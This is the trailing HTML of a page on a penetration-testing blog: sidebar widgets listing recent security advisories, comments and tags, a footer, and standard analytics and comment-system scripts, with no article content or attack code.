</div>
</form>
</aside><aside id="text-3" class="widget widget_text"><h3 class="widget-title">PRODAFT Cyber Intelligence and Cyber Security Services</h3> <div class="textwidget"><a href="https://www.invictuseurope.com/"><img src="https://pentest.blog/wp-content/uploads/Mg6EYwIk_400x400.jpg"></a></div>
</aside>
<aside id="recent-posts-2" class="widget widget_recent_entries">
<h3 class="widget-title">Recent Posts</h3>
<ul>
<li>
<a href="https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/">Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution</a>
</li>
<li>
<a href="https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/">Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137</a>
</li>
<li>
<a href="https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/">Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution</a>
</li>
<li>
<a href="https://pentest.blog/liderahenk-0day-all-your-pardus-clients-belongs-to-me/">LiderAhenk 0day – All your PARDUS Clients Belongs To Me (CVE-2021-3825)</a>
</li>
<li>
<a href="https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/">Pardus 21 Linux Distro – Remote Code Execution 0day 2021 CVE-2021-3806</a>
</li>
</ul>
</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Latest Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href="https://github.com/EgeBalci" class="url" rel="ugc external nofollow">Ege Balci</a></span> on <a href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244">Art of Anti Detection 3 – Shellcode Alchemy</a></li><li class="recentcomments"><span class="comment-author-link">Chase Run Taylor</span> on <a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243">Art of Anti Detection 1 – Introduction to AV &amp; Detection Techniques</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.mehmetince.net/" class="url" rel="ugc external nofollow">Mehmet İnce</a></span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link">0x00</span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.mehmetince.net/" class="url" rel="ugc external nofollow">Mehmet İnce</a></span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a></li></ul></aside><aside id="tag_cloud-2" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="https://pentest.blog/tag/0day/" class="tag-cloud-link tag-link-70 tag-link-position-1" style="font-size: 22pt;" aria-label="0day (16 items)">0day</a>
<a href="https://pentest.blog/tag/1day/" class="tag-cloud-link tag-link-67 tag-link-position-2" style="font-size: 10.709677419355pt;" aria-label="1day (2 items)">1day</a>
<a href="https://pentest.blog/tag/advisory/" class="tag-cloud-link tag-link-66 tag-link-position-3" style="font-size: 18.537634408602pt;" aria-label="advisory (9 items)">advisory</a>
<a href="https://pentest.blog/tag/alienvault/" class="tag-cloud-link tag-link-69 tag-link-position-4" style="font-size: 8pt;" aria-label="alienvault (1 item)">alienvault</a>
<a href="https://pentest.blog/tag/android/" class="tag-cloud-link tag-link-95 tag-link-position-5" style="font-size: 8pt;" aria-label="android (1 item)">android</a>
<a href="https://pentest.blog/tag/application/" class="tag-cloud-link tag-link-98 tag-link-position-6" style="font-size: 8pt;" aria-label="application (1 item)">application</a>
<a href="https://pentest.blog/tag/assembly/" class="tag-cloud-link tag-link-90 tag-link-position-7" style="font-size: 8pt;" aria-label="assembly (1 item)">assembly</a>
<a href="https://pentest.blog/tag/bof/" class="tag-cloud-link tag-link-86 tag-link-position-8" style="font-size: 8pt;" aria-label="bof (1 item)">bof</a>
<a href="https://pentest.blog/tag/burp/" class="tag-cloud-link tag-link-52 tag-link-position-9" style="font-size: 10.709677419355pt;" aria-label="burp (2 items)">burp</a>
<a href="https://pentest.blog/tag/bypass/" class="tag-cloud-link tag-link-78 tag-link-position-10" style="font-size: 10.709677419355pt;" aria-label="bypass (2 items)">bypass</a>
<a href="https://pentest.blog/tag/crypter/" class="tag-cloud-link tag-link-27 tag-link-position-11" style="font-size: 10.709677419355pt;" aria-label="crypter (2 items)">crypter</a>
<a href="https://pentest.blog/tag/decoder/" class="tag-cloud-link tag-link-75 tag-link-position-12" style="font-size: 8pt;" aria-label="decoder (1 item)">decoder</a>
<a href="https://pentest.blog/tag/dns/" class="tag-cloud-link tag-link-15 tag-link-position-13" style="font-size: 14.021505376344pt;" aria-label="dns (4 items)">dns</a>
<a href="https://pentest.blog/tag/emet/" class="tag-cloud-link tag-link-76 tag-link-position-14" style="font-size: 8pt;" aria-label="EMET (1 item)">EMET</a>
<a href="https://pentest.blog/tag/encoder/" class="tag-cloud-link tag-link-74 tag-link-position-15" style="font-size: 8pt;" aria-label="encoder (1 item)">encoder</a>
<a href="https://pentest.blog/tag/exploit/" class="tag-cloud-link tag-link-77 tag-link-position-16" style="font-size: 17.784946236559pt;" aria-label="exploit (8 items)">exploit</a>
<a href="https://pentest.blog/tag/hook/" class="tag-cloud-link tag-link-89 tag-link-position-17" style="font-size: 8pt;" aria-label="hook (1 item)">hook</a>
<a href="https://pentest.blog/tag/iat/" class="tag-cloud-link tag-link-88 tag-link-position-18" style="font-size: 8pt;" aria-label="iat (1 item)">iat</a>
<a href="https://pentest.blog/tag/icmp/" class="tag-cloud-link tag-link-17 tag-link-position-19" style="font-size: 10.709677419355pt;" aria-label="icmp (2 items)">icmp</a>
<a href="https://pentest.blog/tag/in-memory/" class="tag-cloud-link tag-link-84 tag-link-position-20" style="font-size: 8pt;" aria-label="in-memory (1 item)">in-memory</a>
<a href="https://pentest.blog/tag/iot/" class="tag-cloud-link tag-link-104 tag-link-position-21" style="font-size: 8pt;" aria-label="IOT (1 item)">IOT</a>
<a href="https://pentest.blog/tag/linux/" class="tag-cloud-link tag-link-8 tag-link-position-22" style="font-size: 8pt;" aria-label="linux (1 item)">linux</a>
<a href="https://pentest.blog/tag/malware/" class="tag-cloud-link tag-link-25 tag-link-position-23" style="font-size: 14.021505376344pt;" aria-label="malware (4 items)">malware</a>
<a href="https://pentest.blog/tag/metasploit/" class="tag-cloud-link tag-link-61 tag-link-position-24" style="font-size: 17.784946236559pt;" aria-label="metasploit (8 items)">metasploit</a>
<a href="https://pentest.blog/tag/multi-stage/" class="tag-cloud-link tag-link-82 tag-link-position-25" style="font-size: 8pt;" aria-label="multi-stage (1 item)">multi-stage</a>
<a href="https://pentest.blog/tag/nas/" class="tag-cloud-link tag-link-99 tag-link-position-26" style="font-size: 8pt;" aria-label="nas (1 item)">nas</a>
<a href="https://pentest.blog/tag/packer/" class="tag-cloud-link tag-link-81 tag-link-position-27" style="font-size: 10.709677419355pt;" aria-label="packer (2 items)">packer</a>
<a href="https://pentest.blog/tag/php/" class="tag-cloud-link tag-link-12 tag-link-position-28" style="font-size: 8pt;" aria-label="php (1 item)">php</a>
<a href="https://pentest.blog/tag/ransomware/" class="tag-cloud-link tag-link-80 tag-link-position-29" style="font-size: 8pt;" aria-label="ransomware (1 item)">ransomware</a>
<a href="https://pentest.blog/tag/rce/" class="tag-cloud-link tag-link-101 tag-link-position-30" style="font-size: 8pt;" aria-label="rce (1 item)">rce</a>
<a href="https://pentest.blog/tag/reflective/" class="tag-cloud-link tag-link-85 tag-link-position-31" style="font-size: 8pt;" aria-label="reflective (1 item)">reflective</a>
<a href="https://pentest.blog/tag/research/" class="tag-cloud-link tag-link-102 tag-link-position-32" style="font-size: 10.709677419355pt;" aria-label="research (2 items)">research</a>
<a href="https://pentest.blog/tag/reverse/" class="tag-cloud-link tag-link-96 tag-link-position-33" style="font-size: 8pt;" aria-label="reverse (1 item)">reverse</a>
<a href="https://pentest.blog/tag/reversing/" class="tag-cloud-link tag-link-41 tag-link-position-34" style="font-size: 8pt;" aria-label="reversing (1 item)">reversing</a>
<a href="https://pentest.blog/tag/secure-coding/" class="tag-cloud-link tag-link-97 tag-link-position-35" style="font-size: 8pt;" aria-label="secure coding (1 item)">secure coding</a>
<a href="https://pentest.blog/tag/securityonion/" class="tag-cloud-link tag-link-87 tag-link-position-36" style="font-size: 8pt;" aria-label="securityonion (1 item)">securityonion</a>
<a href="https://pentest.blog/tag/self-defence/" class="tag-cloud-link tag-link-91 tag-link-position-37" style="font-size: 8pt;" aria-label="self-defence (1 item)">self-defence</a>
<a href="https://pentest.blog/tag/shellcode/" class="tag-cloud-link tag-link-73 tag-link-position-38" style="font-size: 10.709677419355pt;" aria-label="shellcode (2 items)">shellcode</a>
<a href="https://pentest.blog/tag/siem/" class="tag-cloud-link tag-link-72 tag-link-position-39" style="font-size: 8pt;" aria-label="siem (1 item)">siem</a>
<a href="https://pentest.blog/tag/sql-injection/" class="tag-cloud-link tag-link-13 tag-link-position-40" style="font-size: 12.516129032258pt;" aria-label="sql injection (3 items)">sql injection</a>
<a href="https://pentest.blog/tag/sqlmap/" class="tag-cloud-link tag-link-62 tag-link-position-41" style="font-size: 10.709677419355pt;" aria-label="sqlmap (2 items)">sqlmap</a>
<a href="https://pentest.blog/tag/stager/" class="tag-cloud-link tag-link-83 tag-link-position-42" style="font-size: 8pt;" aria-label="stager (1 item)">stager</a>
<a href="https://pentest.blog/tag/storage/" class="tag-cloud-link tag-link-103 tag-link-position-43" style="font-size: 8pt;" aria-label="storage (1 item)">storage</a>
<a href="https://pentest.blog/tag/tunneling/" class="tag-cloud-link tag-link-14 tag-link-position-44" style="font-size: 8pt;" aria-label="tunneling (1 item)">tunneling</a>
<a href="https://pentest.blog/tag/windows/" class="tag-cloud-link tag-link-51 tag-link-position-45" style="font-size: 12.516129032258pt;" aria-label="windows (3 items)">windows</a></div>
</aside><aside id="custom_html-3" class="widget_text widget widget_custom_html"><h3 class="widget-title">Awarded Top 15 Pentest Blog</h3><div class="textwidget custom-html-widget"><a href="https://blog.feedspot.com/pentest_blogs/" title="Pentest Blogs" target="_blank" rel="noopener"><img alt="Pentest Blogs" src="/wp-content/uploads/pentest_1000px.png"></a>

<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-88100923-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-88100923-1');
</script>
</div></aside> </div>
</div>
</div>
</div>
</div>
<div id="footer-area">
<div class="container footer-inner">
<div class="row">
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="site-info container">
<div class="row">
<nav role="navigation" class="col-md-6">
</nav>
<div class="copyright col-md-6">
INVICTUS Cyber Security &amp; Intelligence Services | Theme by <a href="http://colorlib.com/" target="_blank" rel="nofollow noopener">Colorlib</a> Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> </div>
</div>
</div>
<div class="scroll-to-top"><i class="fa fa-angle-up"></i></div>
</footer>
</div>
</div>
<script type="text/javascript">
		  jQuery(document).ready(function ($) {
			if ($(window).width() >= 767) {
			  $('.navbar-nav > li.menu-item > a').click(function () {
				if ($(this).attr('target') !== '_blank') {
				  window.location = $(this).attr('href')
				}
			  })
			}
		  })
		</script>
<script type="text/javascript" src="https://pentest.blog/wp-content/plugins/asciiplayer/asciinema-player.js?ver=2.4.1" id="asciinema-player-js-js"></script>
<script type="text/javascript" id="disqus_count-js-extra">
/* <![CDATA[ */
var countVars = {"disqusShortname":"pentestblog"};
/* ]]> */
</script>
<script type="text/javascript" src="https://pentest.blog/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.1.1" id="disqus_count-js"></script>
<script type="text/javascript" id="disqus_embed-js-extra">
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.1.1"},"disqusIdentifier":"462 https:\/\/pentest.blog\/?p=462","disqusShortname":"pentestblog","disqusTitle":"Explore Hidden Networks With Double Pivoting","disqusUrl":"https:\/\/pentest.blog\/explore-hidden-networks-with-double-pivoting\/","postId":"462"};
/* ]]> */
</script>
<script type="text/javascript" src="https://pentest.blog/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.1.1" id="disqus_embed-js"></script>
<script type="text/javascript" src="https://pentest.blog/wp-content/themes/sparkling/assets/js/skip-link-focus-fix.min.js?ver=20140222" id="sparkling-skip-link-focus-fix-js"></script>
<script type="text/javascript" src="https://pentest.blog/wp-includes/js/comment-reply.min.js?ver=6.5.3" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" src="https://pentest.blog/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=vLiMInY5I09xi1g" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":2,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
/* ]]> */
</script>


<iframe style="display: none;"></iframe></body></html>